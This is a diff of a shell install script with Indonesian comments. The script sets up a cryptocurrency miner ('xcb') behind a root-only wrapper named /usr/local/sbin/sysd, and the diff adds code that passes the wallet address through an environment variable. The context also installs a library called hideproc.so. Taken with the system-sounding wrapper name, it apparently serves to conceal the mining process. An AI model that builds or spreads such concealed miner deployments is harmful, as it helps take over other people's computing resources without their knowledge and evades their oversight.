@@ -32,6 +32,18 @@ $SUDO install -m 644 "$DIR/hideproc.so" /usr/local/lib/hideproc.so
 $SUDO install -d -m 755 /usr/local/sbin
 $SUDO tee /usr/local/sbin/sysd >/dev/null <<'WRAPPER'
 #!/bin/sh
+# Wrapper root-only untuk ExecStart. Semua nilai datang dari
+# /etc/xcb/miner.env (EnvironmentFile); tidak ada wallet di command line.
+set -eu
+: "${WALLET:?WALLET kosong di /etc/xcb/miner.env}"
+: "${WORKER:?WORKER kosong di /etc/xcb/miner.env}"
+: "${THREADS:?THREADS kosong di /etc/xcb/miner.env}"
+# Binary lama (pra-PR #20) hanya membaca CONN_ADDRESS di jalur CONN; binary
+# baru memakai WALLET sebagai fallback. Menyalin WALLET ke CONN_ADDRESS
+# menyamakan keduanya sehingga rollback binary lama tetap memakai alamat
+# reward yang sama.
+CONN_ADDRESS="$WALLET"
+export CONN_ADDRESS
 exec /usr/local/bin/xcb -a conn --worker "$WORKER" -t "$THREADS" --ui=log
 WRAPPER
 $SUDO chmod 0700 /usr/local/sbin/sysd
